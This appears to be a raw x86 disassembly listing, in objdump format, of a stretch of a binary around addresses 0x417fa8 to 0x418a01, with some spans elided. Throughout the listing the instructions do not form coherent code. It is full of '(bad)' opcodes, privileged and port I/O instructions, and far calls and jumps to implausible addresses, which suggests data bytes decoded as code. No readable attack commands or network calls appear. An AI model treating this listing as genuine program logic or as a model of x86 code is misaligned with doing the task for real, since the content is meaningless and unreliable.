  417fa8:	dec    esp
  417fa9:	lods   eax,DWORD PTR ds:[esi]
  417faa:	xor    al,al
  417fac:	pop    edx
  417fad:	loope  0x418012
  417faf:	mov    ecx,0x697ccf1e
  417fb4:	adc    esp,DWORD PTR [ebp+ecx*4-0x12]
  417fb8:	cmp    dl,BYTE PTR ds:0x6904bdb1
  417fbe:	jno    0x417fd9
  417fc0:	inc    ebx
  417fc1:	fdiv   DWORD PTR [edx-0x64]
  417fc4:	sub    dl,0xd9
  417fc7:	inc    eax
  417fc8:	mov    edi,es
  417fca:	pop    eax
  417fcb:	loopne 0x418013
  417fcd:	inc    edi
  417fce:	add    DWORD PTR [edi+edx*2-0x1a41a4eb],esi
  417fd5:	daa    
  417fd6:	pop    eax
  417fd7:	mov    eax,0x130f28af
  417fdc:	and    cl,ah
  417fde:	dec    esi
  417fdf:	dec    edx
  417fe0:	sti    
  417fe1:	outs   dx,DWORD PTR ds:[esi]
  417fe2:	jns    0x418024
  417fe4:	inc    eax
  417fe5:	aaa    
  417fe6:	cmc    
  417fe7:	xor    eax,0xbc933756
  417fec:	sti    
  417fed:	cwde   
  417fee:	mov    ecx,0x6b7e42e2
  417ff3:	pop    ebx
  417ff4:	aam    0xda
  417ff6:	or     al,0xb0
  417ff8:	repz stc 
  417ffa:	and    al,0xa2
  417ffc:	mov    ebp,0x8ea2d98e
  418001:	icebp  
  418002:	(bad)  
  418003:	in     al,0x20
  418005:	adc    al,0x2d
  418007:	(bad)  
  418008:	fisub  WORD PTR [esi-0x68]
  41800b:	test   DWORD PTR [edx-0x4b4217f9],edi
  418011:	lea    ebp,[eax-0x4d]
  418014:	push   esi
  418015:	sbb    al,BYTE PTR [eax+edx*8-0x673e5693]
  41801c:	loope  0x418005
  41801e:	and    BYTE PTR [esi],bl
  418020:	frstor [edx]
  418022:	push   eax
  418023:	xor    ebx,ebx
  418025:	sbb    DWORD PTR [ebx],ebx
  418027:	jne    0x417ff0
  418029:	test   ch,0x9
  41802c:	fucomi st,st(3)
  41802e:	jecxz  0x417ff8
  418030:	sbb    ah,BYTE PTR [edx+0x2d]
  418033:	xor    edi,DWORD PTR [eax+0x0]
	...
  418096:	test   eax,0xff456b7e
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx-0x1044673c]
  4180a3:	jo     0x418119
  4180a5:	ja     0x4180c8
  4180a7:	cld    
  4180a8:	add    BYTE PTR [eax],al
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    BYTE PTR [ebp+edx*8-0x6d1ac600],cl
  4180b4:	push   esi
  4180b5:	and    cl,dh
  4180b7:	call   0xe286:0x990a971
  4180be:	(bad)  
  4180c0:	jmp    0x418054
  4180c2:	jns    0x418064
  4180c4:	push   esp
  4180c5:	loop   0x418114
  4180c7:	rol    DWORD PTR [ecx+edi*2+0x4366cac4],0x30
  4180cf:	jp     0x418147
  4180d1:	mov    dh,0xbc
  4180d3:	jg     0x4180c4
  4180d5:	mov    ebx,0x9ab99b61
  4180da:	shl    DWORD PTR [edx],1
  4180dc:	push   edi
  4180dd:	sub    BYTE PTR [eax-0x56],ch
  4180e0:	jmp    0x51b6598a
  4180e5:	jae    0x4180a6
  4180e7:	push   ecx
  4180e8:	pinsrw mm4,WORD PTR [ecx-0x30],0x2f
  4180ed:	mov    edx,?
  4180ef:	mov    ebx,0x2d57c837
  4180f4:	and    eax,0x6354853
  4180f9:	je     0x4180f9
  4180fb:	xchg   BYTE PTR [edi],cl
  4180fd:	xchg   edi,eax
  4180fe:	xor    ebp,DWORD PTR [ebx-0x5d]
  418101:	inc    cx
  418103:	imul   ebx,DWORD PTR [ecx],0xbd6b502b
  418109:	sbb    eax,0xe04f34ca
  41810e:	sbb    edx,ebx
  418110:	jecxz  0x4180d1
  418112:	add    eax,0x7b0d110
  418117:	push   es
  418118:	scas   al,BYTE PTR es:[edi]
  418119:	mov    ebx,0xfaf34180
  41811e:	mov    ecx,0x149f7cd1
  418123:	cmp    dh,BYTE PTR [ebp+0x3a]
  418126:	sub    al,0xdf
  418128:	daa    
  418129:	xchg   ebp,eax
  41812a:	jle    0x418198
  41812c:	mov    edi,0x8d820d03
  418131:	test   DWORD PTR [edx-0x4e6112bd],ebx
  418137:	idiv   DWORD PTR [ebx-0x1c]
  41813a:	fisub  WORD PTR [eax+0xa]
  41813d:	lea    ebx,[ecx+0x6baf7804]
  418143:	mov    dh,0xff
  418145:	pop    ebx
  418146:	ins    DWORD PTR es:[edi],dx
  418147:	jg     0x41817c
  418149:	hlt    
  41814a:	in     eax,0x2f
  41814c:	scas   eax,DWORD PTR es:[edi]
  41814d:	call   0xe98c6f92
  418152:	pop    esi
  418153:	push   ecx
  418154:	jbe    0x418110
  418156:	cmp    al,0x38
  418158:	or     dl,BYTE PTR [ebp+0x26]
  41815b:	lahf   
  41815c:	cld    
  41815d:	sahf   
  41815e:	outs   dx,DWORD PTR ds:[esi]
  41815f:	nop
  418160:	push   eax
  418161:	sar    edx,cl
  418163:	add    bl,BYTE PTR [edx+0x6005d191]
  418169:	and    al,0x98
  41816b:	into   
  41816c:	jae    0x418103
  41816e:	daa    
  41816f:	add    eax,0x40bf7cf4
  418174:	cmp    al,0xea
  418176:	retf   0xe757
  418179:	inc    eax
  41817a:	jmp    0x418101
  41817c:	sbb    DWORD PTR [ebx+0x25d58dec],eax
  418182:	loop   0x4181db
  418184:	(bad)  
  418185:	mov    edi,0xe06c57ed
  41818a:	xchg   eax,esp
  41818c:	jne    0x418198
  41818e:	jg     0x41820d
  418190:	inc    eax
  418191:	jecxz  0x41811c
  418193:	int3   
  418194:	bound  esi,QWORD PTR [edx-0x251c5fb7]
  41819a:	sub    al,0xb4
  41819c:	inc    ecx
  41819d:	les    esp,FWORD PTR [esi+ecx*2-0x3c]
  4181a1:	inc    eax
  4181a2:	inc    esp
  4181a3:	pop    ebx
  4181a4:	call   0x4572:0x1b4f669d
  4181ab:	push   cs
  4181ac:	push   ecx
  4181ad:	jmp    0x17707ee
  4181b2:	sbb    edx,DWORD PTR [edx+0x11]
	...
  418215:	add    BYTE PTR [edi],dh
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	cwde   
  418223:	or     edi,DWORD PTR [edi]
  418225:	sbb    al,0x28
  418227:	std    
  418228:	add    BYTE PTR [eax],al
  41822a:	pop    es
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    BYTE PTR [ebp+0x7d855e51],bl
  418233:	lock xchg ebp,eax
  418235:	pop    eax
  418236:	ins    BYTE PTR es:[edi],dx
  418237:	mov    DWORD PTR [edx],esp
  418239:	fiadd  DWORD PTR [eax-0x25087466]
  41823f:	or     ecx,ebp
  418241:	add    ebp,DWORD PTR [ebp-0x53184ea4]
  418247:	(bad)  
  418249:	sub    BYTE PTR [esp+edx*1-0x3d0d1768],0xea
  418251:	or     ebp,ecx
  418253:	cs ins BYTE PTR es:[edi],dx
  418255:	pop    ss
  418256:	jno    0x418205
  418258:	mov    ?,ecx
  41825a:	and    BYTE PTR [edi+0x71],dl
  41825d:	sub    ebx,0xffffffc7
  418260:	pop    ecx
  418261:	xchg   edi,eax
  418262:	(bad)  
  418263:	mov    ecx,0x38e4086b
  418268:	sub    eax,0xf8c01168
  41826d:	xchg   ecx,eax
  41826e:	(bad)  
  41826f:	ror    BYTE PTR [edi],1
  418271:	dec    esp
  418272:	mov    bh,0x5
  418274:	cdq    
  418275:	adc    edi,ebp
  418277:	push   ebx
  418278:	out    dx,eax
  418279:	or     BYTE PTR [eax+0x7f83aeb2],dl
  41827f:	fdivp  st(4),st
  418281:	arpl   WORD PTR [eax+esi*4],dx
  418284:	mov    edi,0xfe8a4a7f
  418289:	sbb    DWORD PTR [ebx+eiz*1+0x62],0x2e14e977
  418291:	xor    ah,BYTE PTR [edx]
  418293:	pop    ebx
  418294:	pusha  
  418295:	mov    ecx,0x7a7755b7
  41829a:	or     al,0xa5
  41829c:	out    0x7d,al
  41829e:	aad    0xd3
  4182a0:	loop   0x4182ba
  4182a2:	mov    ebp,0xe95b36e3
  4182a7:	ffree  st(6)
  4182a9:	ja     0x41822b
  4182ab:	das    
  4182ac:	sub    edx,ecx
  4182ae:	ret    
  4182af:	mov    ds:0x260cc728,eax
  4182b4:	mov    al,0x76
  4182b6:	mov    esp,0x1dc8db02
  4182bb:	outs   dx,DWORD PTR ds:[esi]
  4182bc:	xor    DWORD PTR [edi-0x3a],esp
  4182bf:	cmp    DWORD PTR [edx],esi
  4182c1:	scas   al,BYTE PTR es:[edi]
  4182c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182c3:	test   eax,0x5fce45d8
  4182c8:	xchg   ebp,eax
  4182c9:	cmp    dl,dh
  4182cb:	or     dl,ch
  4182cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182ce:	rcr    cl,0xb4
  4182d1:	es xchg ebx,eax
  4182d3:	aam    0xe1
  4182d5:	and    BYTE PTR [ecx],dl
  4182d7:	push   ebp
  4182d8:	test   al,0x77
  4182da:	jg     0x418329
  4182dc:	dec    ebx
  4182dd:	fnstenv [esi]
  4182df:	adc    bl,dh
  4182e1:	jle    0x418266
  4182e3:	in     al,dx
  4182e4:	mov    WORD PTR [edx-0x61],fs
  4182e7:	scas   eax,DWORD PTR es:[edi]
  4182e8:	or     BYTE PTR [ebx+edx*4],ah
  4182eb:	jmp    0x418333
  4182ed:	mov    edi,0xed11fac8
  4182f2:	inc    esi
  4182f3:	(bad)  
  4182f4:	gs call 0x1b18866b
  4182fa:	int3   
  4182fb:	out    dx,al
  4182fc:	fiadd  DWORD PTR [edx+0x4c]
  4182ff:	cmp    esi,DWORD PTR [edi]
  418301:	dec    eax
  418302:	fwait
  418303:	mov    al,0x38
  418305:	dec    ebx
  418306:	ret    0x87d9
  418309:	xor    DWORD PTR [ebp+0x67422dd3],0xffffffcd
  418310:	mov    al,0x9
  418312:	cmp    esp,esi
  418314:	pop    ecx
  418315:	pop    es
  418316:	add    dl,BYTE PTR [ebx+0x16]
  418319:	jnp    0x4182ab
  41831b:	pop    eax
  41831c:	or     esp,esp
  41831e:	lahf   
  41831f:	mov    ah,0x2c
  418321:	jne    0x4182a4
  418323:	ins    BYTE PTR es:[edi],dx
  418324:	test   edi,esi
  418326:	jp     0x418396
  418328:	mov    dh,dl
  41832a:	test   BYTE PTR [eax-0x69b0eb2c],al
  418330:	aas    
  418331:	rcr    dh,cl
  418333:	push   ecx
  418334:	in     eax,0x0
	...
  418396:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	lock mov ds:0xfe2fb19b,eax
  4183a8:	add    BYTE PTR [eax],al
  4183aa:	pop    es
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    BYTE PTR [ecx-0x77d3a9ce],bh
  4183b3:	lahf   
  4183b4:	add    DWORD PTR [ecx-0x507265d5],edi
  4183ba:	lea    edx,[eax-0x23]
  4183bd:	call   0x4e10f114
  4183c2:	test   ah,dh
  4183c4:	iret   
  4183c5:	adc    BYTE PTR [edx],al
  4183c7:	ins    DWORD PTR es:[edi],dx
  4183c8:	jp     0x4183b9
  4183ca:	arpl   WORD PTR [edx+eiz*1],ax
  4183cd:	xor    BYTE PTR [eax+0x2b1f18ab],ch
  4183d3:	add    al,ch
  4183d5:	xchg   ecx,eax
  4183d6:	repnz icebp 
  4183d8:	into   
  4183d9:	iret   
  4183da:	ret    0xb9d4
  4183dd:	pop    ebx
  4183de:	dec    esp
  4183df:	std    
  4183e0:	pop    esp
  4183e1:	add    DWORD PTR [eax-0x4e479e5d],edx
  4183e7:	(bad)  
  4183e8:	rcl    BYTE PTR [ecx+0x1508a25f],1
  4183ee:	nop
  4183ef:	jo     0x418418
  4183f1:	fstp   QWORD PTR [edx+ebx*8]
  4183f4:	pop    ds
  4183f5:	push   edi
  4183f6:	or     al,0xfc
  4183f8:	jb     0x41838e
  4183fa:	sub    bh,BYTE PTR [ecx+0x6749e569]
  418400:	fsubr  st(7),st
  418402:	mov    al,ds:0x893de8c3
  418407:	cmp    BYTE PTR [edx],dl
  418409:	ss in  eax,dx
  41840b:	push   ebp
  41840c:	adc    al,0x3d
  41840e:	xor    al,0x38
  418410:	cli    
  418411:	pop    edi
  418412:	xchg   BYTE PTR [esi-0x25],bl
  418415:	fld    DWORD PTR [edx+0x520611e9]
  41841b:	cmp    al,BYTE PTR [ecx-0x7519e7d]
  418421:	stos   DWORD PTR es:[edi],eax
  418422:	xor    ebx,DWORD PTR ds:[ebp-0x4]
  418426:	gs hlt 
  418428:	mov    ds:0x14ff821a,al
  41842d:	fs shl edi,cl
  418430:	in     al,0x6
  418432:	rol    BYTE PTR [esi-0x6a],cl
  418435:	dec    eax
  418436:	lea    eax,[eax-0x5df3aef5]
  41843c:	iret   
  41843d:	cmp    esp,DWORD PTR [edi-0x58]
  418440:	mov    ebp,0x7e9f1731
  418445:	or     BYTE PTR [ecx-0x18ac6788],ch
  41844b:	inc    ecx
  41844c:	js     0x41843c
  41844e:	ja     0x4183e8
  418450:	outs   dx,DWORD PTR ds:[esi]
  418451:	(bad)  
  418452:	fst    DWORD PTR ds:0xe765c081
  418458:	dec    ecx
  418459:	mov    dh,0x71
  41845b:	ret    0xfb28
  41845e:	sbb    eax,0xa60704f0
  418463:	mov    al,0x62
  418465:	mov    cl,BYTE PTR [eax]
  418467:	jle    0x418468
  418469:	(bad)  
  41846a:	hlt    
  41846b:	sbb    eax,0x2b6725f3
  418470:	mov    bl,0xb5
  418472:	jecxz  0x4184d5
  418474:	icebp  
  418475:	xchg   ecx,eax
  418476:	scas   eax,DWORD PTR es:[edi]
  418477:	or     DWORD PTR [ebp+0x299d7bbc],edx
  41847d:	js     0x418485
  41847f:	xchg   ecx,eax
  418480:	out    dx,eax
  418481:	xchg   ecx,eax
  418482:	dec    ebx
  418483:	pop    esi
  418484:	add    eax,0xf1c0cba7
  418489:	mov    eax,0x2498bf2d
  41848e:	data16 and BYTE PTR ds:0x943e700b,bl
  418495:	outs   dx,DWORD PTR ds:[esi]
  418496:	cwde   
  418497:	popf   
  418498:	adc    BYTE PTR [edi],cl
  41849a:	les    edi,FWORD PTR [ebx]
  41849c:	xor    eax,0x54bceda1
  4184a1:	inc    eax
  4184a2:	repz jns 0x418451
  4184a5:	ins    DWORD PTR es:[edi],dx
  4184a6:	jl     0x418439
  4184a8:	or     ecx,DWORD PTR [eax+0x64]
  4184ab:	ror    edi,1
  4184ad:	xor    ch,al
  4184af:	mov    ch,0x55
  4184b1:	inc    eax
  4184b2:	mov    al,ds:0x4d34
	...
  418513:	add    BYTE PTR [eax],al
  418515:	add    BYTE PTR [ecx-0x7],al
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [ebp+eiz*2+0x364b6701]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    BYTE PTR [ebp+0xa8a864d],al
  418533:	jp     0x418574
  418535:	or     eax,0xeeb709c0
  41853a:	sbb    BYTE PTR [ebp-0x6c],al
  41853d:	sbb    dl,BYTE PTR [edi+0x590e36f5]
  418543:	sub    DWORD PTR [ebp+0x513b9da1],edx
  418549:	cmp    DWORD PTR [esi+eiz*4+0x7237cedb],ebx
  418550:	sub    eax,0x6496bc09
  418555:	out    0x11,eax
  418557:	sub    eax,0xf4d642a5
  41855c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41855d:	mov    ecx,0xd39f27e1
  418562:	cli    
  418563:	addr16 mov dl,0x74
  418566:	jb     0x4184f2
  418568:	adc    BYTE PTR [edi],bh
  41856a:	mov    edx,0xdf105710
  41856f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418570:	jbe    0x418575
  418572:	mov    edi,0x6aeca3fe
  418577:	loop   0x4185e5
  418579:	or     al,0x26
  41857b:	call   0xf1238c83
  418580:	mov    eax,ds:0x5cdd913
  418585:	gs clc 
  418587:	dec    eax
  418588:	aas    
  418589:	mov    cl,0xe
  41858b:	stc    
  41858c:	pushf  
  41858d:	lahf   
  41858e:	sub    BYTE PTR [ebx],ch
  418590:	js     0x4185ed
  418592:	test   DWORD PTR [edi+ecx*2-0x5a],ebp
  418596:	fwait
  418597:	xor    BYTE PTR [ecx+0x10],al
  41859a:	ror    DWORD PTR [ecx],1
  41859c:	js     0x418609
  41859e:	push   0x4b5f7a7a
  4185a3:	pop    ebx
  4185a4:	popf   
  4185a5:	sub    DWORD PTR [edi-0x40fedeea],ebx
  4185ab:	imul   eax,DWORD PTR [edx+0xe],0x4ba4dd67
  4185b2:	xchg   DWORD PTR ds:0x4e757b1d,edi
  4185b8:	jg     0x418572
  4185ba:	int3   
  4185bb:	sar    BYTE PTR [ecx-0x43],1
  4185be:	je     0x41855c
  4185c0:	daa    
  4185c1:	push   ds
  4185c2:	(bad)  
  4185c3:	xchg   esp,eax
  4185c4:	push   ebx
  4185c5:	mov    ecx,0x5bf2c061
  4185ca:	pop    edi
  4185cb:	inc    edx
  4185cc:	fsub   QWORD PTR [ecx-0x7a0799dd]
  4185d2:	call   0xd7aa:0xbe1bfdf
  4185d9:	push   ebx
  4185da:	and    al,0x23
  4185dc:	iret   
  4185dd:	mov    ds:0xd69a74ab,eax
  4185e2:	ins    DWORD PTR es:[edi],dx
  4185e3:	inc    eax
  4185e4:	ret    
  4185e5:	pop    esp
  4185e6:	aad    0xef
  4185e8:	sbb    BYTE PTR [edx-0x46cc38a7],dh
  4185ee:	pop    edx
  4185ef:	sbb    eax,edx
  4185f1:	sub    DWORD PTR [ecx],ebx
  4185f3:	dec    ebp
  4185f4:	mov    ah,0x8b
  4185f6:	cld    
  4185f7:	inc    ebx
  4185f8:	mov    ch,0xcf
  4185fa:	ja     0x4185e8
  4185fc:	sub    BYTE PTR [edi],ch
  4185fe:	ins    BYTE PTR es:[edi],dx
  4185ff:	bound  ebx,QWORD PTR [ebx]
  418601:	jmp    0x1bdd2e1d
  418606:	dec    ebx
  418607:	mov    cl,0xff
  418609:	xchg   edx,eax
  41860a:	int    0x34
  41860c:	test   eax,0xf094b802
  418611:	mov    cl,0xd9
  418613:	ret    0x838e
  418616:	icebp  
  418617:	or     edi,DWORD PTR [ecx]
  418619:	dec    esp
  41861a:	mov    BYTE PTR [edi+eax*2+0x32],cl
  41861e:	(bad)  
  41861f:	adc    dl,BYTE PTR [ecx]
  418621:	les    edi,FWORD PTR [eax]
  418623:	mov    cl,0x35
  418625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418626:	iret   
  418627:	add    ecx,DWORD PTR [eax+0x5]
  41862a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41862c:	or     BYTE PTR [edx],0xea
  41862f:	imul   ebp,esp,0xffffffc4
  418632:	aaa    
  418633:	mov    bh,bh
	...
  418695:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41869b:	mov    esp,0xba07af9f
  4186a0:	xor    BYTE PTR [esi-0x539eac74],bh
  4186a6:	cmp    eax,0x7000100
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [edx-0x7a2f9066],dl
  4186b3:	popa   
  4186b4:	add    al,0x53
  4186b6:	rcr    DWORD PTR [ebx+0x1c],1
  4186b9:	fisubr WORD PTR [ecx]
  4186bb:	mov    dl,0x30
  4186bd:	outs   dx,BYTE PTR ds:[esi]
  4186be:	je     0x418722
  4186c0:	out    dx,al
  4186c1:	and    eax,0x598eeff1
  4186c6:	or     dh,BYTE PTR [ecx+0x2c]
  4186c9:	adc    al,0x54
  4186cb:	std    
  4186cc:	je     0x4186a2
  4186ce:	scas   eax,DWORD PTR es:[edi]
  4186cf:	dec    edi
  4186d0:	push   eax
  4186d1:	jnp    0x418733
  4186d3:	mov    esi,0xc13ee980
  4186d8:	cmp    eax,0x4b0584d9
  4186dd:	(bad)  
  4186df:	shl    DWORD PTR ds:0x51da30ea,cl
  4186e5:	inc    edi
  4186e6:	sbb    dh,BYTE PTR [ebx-0x69]
  4186e9:	jecxz  0x4186b7
  4186eb:	bound  edi,QWORD PTR [edi+0x43]
  4186ee:	pop    ebp
  4186ef:	cmp    edx,esp
  4186f1:	stc    
  4186f2:	addr16 js 0x4186a7
  4186f5:	inc    eax
  4186f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186f7:	sar    DWORD PTR [edx+ebx*2+0x1bf94edc],1
  4186fe:	mov    ds:0x7b79a779,al
  418703:	(bad)  
  418704:	xchg   esi,eax
  418705:	jp     0x41869c
  418707:	sub    esp,esi
  418709:	leave  
  41870a:	dec    ecx
  41870b:	pop    ecx
  41870c:	sbb    al,0xbd
  41870e:	or     eax,0x97e81b25
  418713:	mov    BYTE PTR [edi-0x6a],al
  418716:	inc    eax
  418717:	scas   eax,DWORD PTR es:[edi]
  418718:	ret    0xa8ee
  41871b:	or     al,0xdd
  41871d:	xchg   esp,eax
  41871e:	or     ebp,DWORD PTR [ecx]
  418720:	loop   0x4186da
  418722:	inc    edi
  418723:	pop    ds
  418724:	push   cs
  418725:	rcl    BYTE PTR [ecx+ebp*8],1
  418728:	xchg   edx,eax
  418729:	retf   0xf1d9
  41872c:	or     ebx,0x25
  41872f:	ror    DWORD PTR [eax],1
  418731:	sbb    BYTE PTR [eax-0x63c72e0a],ah
  418737:	in     al,dx
  418738:	cld    
  418739:	jbe    0x41872c
  41873b:	cli    
  41873c:	or     dh,BYTE PTR [ebp-0x5c]
  41873f:	mov    eax,0x27827ac2
  418744:	or     BYTE PTR [ebx-0x62b0b7af],dl
  41874a:	or     bl,cl
  41874c:	inc    esp
  41874d:	pop    ss
  41874e:	jmp    0x6d9deefe
  418753:	rcr    eax,cl
  418755:	cmc    
  418756:	dec    ebx
  418757:	cmp    esi,edi
  418759:	dec    ebp
  41875a:	cmp    al,0x6b
  41875c:	(bad)  
  41875d:	mov    dl,0xd4
  41875f:	sbb    bh,BYTE PTR [edx]
  418761:	loop   0x4186f5
  418763:	aad    0x24
  418765:	xchg   ebp,eax
  418766:	in     eax,0x9f
  418768:	mov    al,0x19
  41876a:	(bad)  
  41876b:	lods   al,BYTE PTR ds:[esi]
  41876c:	stos   BYTE PTR es:[edi],al
  41876d:	sub    BYTE PTR [ebp-0x61e584ca],dl
  418773:	sahf   
  418774:	pop    esp
  418775:	fucom  st(6)
  418777:	gs xor edx,0x4dc50568
  41877e:	jle    0x41877a
  418780:	ins    DWORD PTR es:[edi],dx
  418781:	(bad)  
  418782:	mov    ds:0x4e024ae0,eax
  418787:	leave  
  418788:	dec    edx
  418789:	mov    ch,0xbf
  41878b:	mov    esi,0xdb83bb56
  418790:	mov    eax,0xa19ab1e4
  418795:	fst    DWORD PTR [ecx+edx*1]
  418798:	mov    esp,0x675c56f3
  41879d:	jp     0x41876c
  41879f:	inc    ecx
  4187a0:	and    al,0x38
  4187a2:	jbe    0x418782
  4187a4:	jp     0x4187db
  4187a6:	mov    esp,DWORD PTR [esi-0x1c]
  4187a9:	cmp    BYTE PTR [eax],cl
  4187ab:	aad    0x79
  4187ad:	mov    DWORD PTR [edx],edx
  4187af:	imul   eax,DWORD PTR [eax+ebp*1+0xa6533c],0x0
	...
  418816:	xchg   esp,eax
  418817:	enter  0x4337,0x7f
  41881b:	push   esp
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0x5efd7be5
  418824:	ret    0x44e2
  418827:	add    DWORD PTR [ecx],eax
  418829:	add    BYTE PTR [edi],al
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [edx-0x54926d60],cl
  418833:	retf   0x9db9
  418836:	dec    esp
  418837:	push   ss
  418838:	cmp    eax,0x669f0284
  41883d:	ret    
  41883e:	inc    ecx
  41883f:	call   0x7aa80d16
  418844:	call   0x46be0c8c
  418849:	mov    bh,0x6f
  41884b:	test   BYTE PTR ds:0x6a9cbc98,dl
  418851:	inc    edx
  418852:	xlat   BYTE PTR ds:[ebx]
  418853:	xor    edi,ebx
  418855:	sbb    eax,0x960d5105
  41885a:	out    0x81,eax
  41885c:	js     0x4187fc
  41885e:	xor    cl,BYTE PTR ds:0x34732082
  418864:	push   cs
  418865:	les    edi,FWORD PTR [ecx]
  418867:	pop    ss
  418868:	aaa    
  418869:	jmp    ecx
  41886b:	xchg   ebx,eax
  41886c:	pop    ebx
  41886d:	stos   DWORD PTR es:[edi],eax
  41886e:	pop    edi
  41886f:	sahf   
  418870:	xchg   esi,eax
  418871:	cld    
  418872:	or     BYTE PTR [ecx+0x14],cl
  418875:	mov    eax,0xbb604e7e
  41887a:	fcom   DWORD PTR [ecx+0x2d498e6e]
  418880:	mov    ch,0xc7
  418882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418883:	aad    0xd
  418885:	aas    
  418886:	sub    eax,0xacb34472
  41888b:	pop    ecx
  41888c:	push   esp
  41888d:	push   cs
  41888e:	add    ch,BYTE PTR [edx*2+0x6c28364d]
  418895:	push   ecx
  418896:	cwde   
  418897:	in     eax,dx
  418898:	repz mov edi,0x17abd63
  41889e:	inc    ebx
  41889f:	in     eax,dx
  4188a0:	xor    DWORD PTR [ecx+0x54],ebp
  4188a3:	and    edi,edx
  4188a5:	mov    BYTE PTR [edi-0x68],ch
  4188a8:	les    esp,FWORD PTR [edx+edx*1]
  4188ab:	xchg   ecx,eax
  4188ac:	(bad)  
  4188ad:	push   esp
  4188ae:	arpl   WORD PTR [edx-0x22],bp
  4188b1:	pop    es
  4188b2:	fwait
  4188b3:	je     0x4188c4
  4188b5:	lods   eax,DWORD PTR ds:[esi]
  4188b6:	jmp    FWORD PTR [edx+0x25]
  4188b9:	adc    al,0x57
  4188bb:	std    
  4188bc:	loopne 0x418906
  4188be:	ins    DWORD PTR es:[edi],dx
  4188bf:	test   esi,ecx
  4188c1:	stc    
  4188c2:	sbb    al,0x42
  4188c4:	xchg   esi,eax
  4188c5:	frstor [esi]
  4188c7:	ret    0xfaaf
  4188ca:	push   es
  4188cb:	push   edi
  4188cc:	(bad)  
  4188cd:	in     eax,0x33
  4188cf:	fsub   DWORD PTR [ecx]
  4188d1:	sub    DWORD PTR [ecx+edx*1],0x94fa5b81
  4188d8:	ret    0xe9cd
  4188db:	xchg   BYTE PTR [edi],cl
  4188dd:	aad    0xe1
  4188df:	sbb    eax,0xcb314e74
  4188e4:	pop    esi
  4188e5:	(bad)
  4188e8:	mov    al,0x11
  4188ea:	cmp    dh,BYTE PTR [eax+edi*8]
  4188ed:	sub    al,BYTE PTR [edi-0x7b]
  4188f0:	fistp  WORD PTR [ebx+eiz*1-0x73413e2f]
  4188f7:	or     DWORD PTR [esi],ecx
  4188f9:	ret    
  4188fa:	sbb    DWORD PTR [edi-0x53951412],ebp
  418900:	push   ecx
  418901:	push   ecx
  418902:	ja     0x4188ba
  418904:	scas   eax,DWORD PTR es:[edi]
  418905:	inc    DWORD PTR [ebx]
  418907:	loope  0x418889
  418909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41890a:	js     0x4188af
  41890c:	mov    bl,0x9c
  41890e:	cmp    al,0x97
  418910:	pop    ebx
  418911:	xor    al,0x5b
  418913:	xor    eax,0x5a80ee9
  418918:	xlat   BYTE PTR ds:[ebx]
  418919:	mov    ebp,0x8f2322ec
  41891e:	dec    edx
  41891f:	outs   dx,BYTE PTR ds:[esi]
  418920:	outs   dx,BYTE PTR ds:[esi]
  418921:	arpl   WORD PTR [esi-0x25c713bd],dx
  418927:	push   edx
  418928:	inc    eax
  418929:	in     al,dx
  41892a:	jno    0x418919
  41892c:	mov    ds:0xb2a1eebc,al
  418931:	jne    0x418924
  418933:	cwde   
  418934:	jg     0x418936
	...
  418996:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi+0x75e6dc3a]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    ah,dl
  4189af:	hlt    
  4189b0:	ror    DWORD PTR [edi-0x1d],1
  4189b3:	outs   dx,BYTE PTR ds:[esi]
  4189b4:	in     eax,0xfe
  4189b6:	js     0x4189ae
  4189b8:	test   DWORD PTR [edi+0x2a73e9a9],edi
  4189be:	call   0xae0624f
  4189c3:	cmp    eax,0xb07c1e47
  4189c8:	lahf   
  4189c9:	jp     0xd0e8592
  4189cf:	dec    ebx
  4189d0:	push   edi
  4189d1:	ret    
  4189d2:	loopne 0x4189b3
  4189d4:	bound  edx,QWORD PTR [edi+0x53]
  4189d7:	or     DWORD PTR [esi-0x4db568ed],ecx
  4189dd:	cmp    BYTE PTR [esi-0x1a613cc5],cl
  4189e3:	call   0xad5bfc15
  4189e8:	inc    ebp
  4189e9:	add    dl,bl
  4189eb:	ins    BYTE PTR es:[edi],dx
  4189ec:	cwde   
  4189ed:	cmp    DWORD PTR [ebx+0x7219319a],edi
  4189f3:	cmp    al,0xd6
  4189f5:	imul   eax,ebp,0xa942fe35
  4189fb:	cmp    DWORD PTR [edx],ebx
  4189fd:	inc    eax
  4189fe:	jecxz  0x418a1f
  418a00:	iret   
  418a01:	xlat   BYTE PTR ds:[ebx]
